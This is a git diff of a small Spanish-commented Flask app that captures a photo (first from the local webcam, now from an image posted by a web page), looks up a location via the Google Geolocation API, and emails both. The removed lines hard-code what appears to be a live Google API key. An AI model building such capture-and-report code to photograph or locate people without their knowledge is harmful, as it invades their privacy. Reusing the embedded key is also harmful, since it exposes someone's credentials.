@@ -1,5 +1,7 @@
-from flask import Flask, request, jsonify, send_file
-import cv2
+from flask import Flask, request, jsonify, render_template
+from io import BytesIO
+from PIL import Image
+import base64
 import requests
 import json
 import smtplib
@@ -8,27 +10,35 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import os
+from dotenv import load_dotenv
 
 app = Flask(__name__)
 
 api_key = os.getenv('GOOGLE_API_KEY')
 email_password = os.getenv('EMAIL_PASSWORD')
 
-def capture_photo():
-    # Acceso a la webcam
-    cam = cv2.VideoCapture(0)
-    result, image = cam.read()
-    cam.release()
+@app.route('/')
+def index():
+    return render_template('index.html')
 
-    if result:
-        photo_path = "photo.jpg"
-        cv2.imwrite(photo_path, image)
-        print(f"Imagen capturada y guardada en {photo_path}")
-        return photo_path
-    else:
-        print("Error al capturar la imagen")
-        return None
+@app.route('/upload', methods=['POST'])
+def upload():
+    data = request.get_json()
+    image_data = data['image'].split(",")[1]
+    image = Image.open(BytesIO(base64.b64decode(image_data)))
+    photo_path = "photo.jpg"
+    image.save(photo_path)
     
+    # Obten la ubicación
+    location, address, maps_url = get_location(api_key)
+    
+    if location:
+        send_email(photo_path, location, address, maps_url)
+        if os.path.exists(photo_path):
+            os.remove(photo_path)
+        return jsonify(status="success", message="Email sent successfully.")
+    else:
+        return jsonify(status="error", message="Failed to obtain location.")
 
 def get_location(api_key):
     # Uso de la API de Google Maps Geolocation para obtener una ubicación más precisa
@@ -96,29 +106,7 @@ def send_email(photo_path, location, address, maps_url):
     if os.path.exists(photo_path):
         os.remove(photo_path)
         print(f"Archivo eliminado: {photo_path}")
-        
-# Captura y envía la foto
-# photo_path = capture_photo()
-# if photo_path:
-#     location = (40.7128, -74.0060)  # Ejemplo de coordenadas
-#     address = "Nueva York, NY"
-#     maps_url = "https://maps.google.com/?q=40.7128,-74.0060"
-#     send_email(photo_path, location, address, maps_url)
-
-@app.route('/run', methods=['GET'])
-def run_script():
-    api_key = "AIzaSyDBoTuvRrlDEq3I-_ZTP5vKfEIITIBQGYY"  # Reemplaza con tu clave de API de Google
-    
-    photo_path = capture_photo()
-    location, address, maps_url = get_location(api_key)
-    if location:
-        send_email(photo_path, location, address, maps_url)
-        
-        if photo_path and os.path.exists(photo_path):
-            os.remove(photo_path)
-        return jsonify(status="success", message="Email sent successfully.")
-    else:
-        return jsonify(status="error", message="Failed to obtain location.")
 
 if __name__ == '__main__':
     app.run(debug=True)
+
